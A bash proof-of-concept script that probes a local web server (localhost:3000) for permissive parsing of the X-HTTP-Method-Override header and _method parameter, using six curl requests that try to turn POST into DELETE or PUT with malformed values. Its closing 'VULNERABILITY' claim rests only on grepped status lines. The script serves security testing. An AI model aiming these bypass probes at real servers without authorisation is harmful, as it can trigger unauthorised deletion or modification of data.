#!/bin/bash

TARGET="http://localhost:3000/"
DATA="name=Test&surname=User&address=123"

echo "=== Permissive HTTP Method Override Parsing PoC ==="
echo ""

echo "[*] Test 1: Method override with surrounding spaces:"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override:  DELETE  " -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Test 2: Multiple method names in single override value:"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: DELETE PUT" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Test 3: Semicolon-separated method values:"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: DELETE;PUT" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Test 4: Comma-separated method values:"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: DELETE,PUT" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Test 5: Tab character in method value:"
curl -s -i "$TARGET" -X POST -H "X-HTTP-Method-Override: DELETE$(printf '\t')PUT" -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo "[*] Test 6: Combining multiple bypass techniques:"
curl -s -i "$TARGET?_method=DELETE;PUT" -X POST -H "X-HTTP-Method-Override:  DELETE,PUT  " -H "Content-Type: application/x-www-form-urlencoded" -d "$DATA" 2>&1 | grep "HTTP/1.1"

echo ""
echo "[+] VULNERABILITY: Parser accepts and processes malformed override values"
echo "[+] This suggests lenient parsing that may accept various input formats"
